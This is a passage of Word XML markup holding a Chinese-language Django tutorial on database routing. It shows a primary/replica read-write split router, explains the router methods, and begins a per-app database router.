        <w:t>第二步 自定义数据库路由Router</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76801317" w14:textId="799EE85E" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在Django项目的根目录下创建 database_router.py 文件, 添加如下代码，自定义数据库路由。该路由规定了读取数据时将随机从replica1和replica2数据库中读取，而写入数据总是写入主数据库primary。该路由还允许三个数据库中的字段建立联系。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CF2077" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class PrimaryReplicaRouter(object):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F027EA8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def db_for_read(self, model, **hints):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7328FA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2341FA69" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        Reads go to a randomly-chosen replica.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1877753F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0A21BC" w14:textId="1BA3E542" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return random.choice(['replica1', 'replica2'])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382AF07F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def db_for_write(self, model, **hints):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEE172D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3623D2D9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        Writes always go to primary.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57BFE2AB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22452F97" w14:textId="5838F1DF" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return 'primary'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469F092F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def allow_relation(self, obj1, obj2, **hints):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B0D418" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151CC9C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        Relations between objects are allowed if both objects are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB3ED83" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        in the primary/replica pool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4092D25A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BBCE73" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        db_list = ('primary', 'replica1', 'replica2')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E90783" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if obj1._state.db in db_list and obj2._state.db in db_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235646C2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EE36E2" w14:textId="5F443F30" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E28F0A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def allow_migrate(self, db, app_label, model_name=None, **hints):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E01780" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF639F7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        All models end up in this pool.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57450A6B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E69D991" w14:textId="2A1A8AA1" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26409B65" w14:textId="36D778AA" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>一个数据库路由是一个类，这个类最多有四个方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179630DC" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>db_for_read(model, **hints)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79260193" w14:textId="3F48A9AB" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>建议 model 对象进行读操作时使用的数据库。如果一个数据库操作可以提供对选择数据库有用的附加信息，那么可以通过 hints 字典提供。如果没有建议则返回 None 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42176D26" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>db_for_write(model, **hints)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317C00FB" w14:textId="61A1EA33" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>建议 model 对象进行写操作时使用的数据库。如果一个数据库操作可以提供对选择数据库有用的附加信息，那么可以通过 hints 字典提供。如果没有建议则返回 None 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3E6BA1" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>allow_relation(obj1, obj2, **hints)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B6A8F5B" w14:textId="1BA281A5" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当 obj1 和 obj2 之间允许有关系时返回 True ，不允许时返回 False ，或者没有意见时返回 None 。这是一个纯粹的验证操作，用于外键和多对多操作中，两个对象的关系是否被允许。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020A5FA4" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>allow_migrate(db, app_label, model_name)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258D7431" w14:textId="4454459F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>决定 model 是否可以和 db 为别名的数据库同步。如果可以返回True ， 如果不可以返回 False ，或者没有意见时返回 None 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BB1CB2" w14:textId="1A7395BD" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django项目按APP分库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17DBA789" w14:textId="721F539C" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在大型web项目中，我们常常会创建多个app来处理不同的业务，如果希望实现app之间的数据库分离，比如app01走数据库db1，app02走数据库db2，而不是实现读写分离。我们可以定义如下所示的数据库路由, 然后将其加入settings.py 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E1EB92" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class AppDBRouter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CF8CD3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def db_for_read(self, model, **hints):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D62093" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if model._meta.app_label == 'app01':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C01B195" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return 'db1'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA59968" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if model._meta.app_label == 'app02':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56466705" w14:textId="113E3493" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return 'db2'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E800AD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def db_for_write(self, model, **hints):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41ADBCFC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">       if model._meta.app_label == 'app01':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D8E2F1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return 'db1'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428EA1BE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">       if model._meta.app_label == 'app02':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EC073D" w14:textId="4EC907D4" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return 'db2'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059BA43D" w14:textId="1991B8F7" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
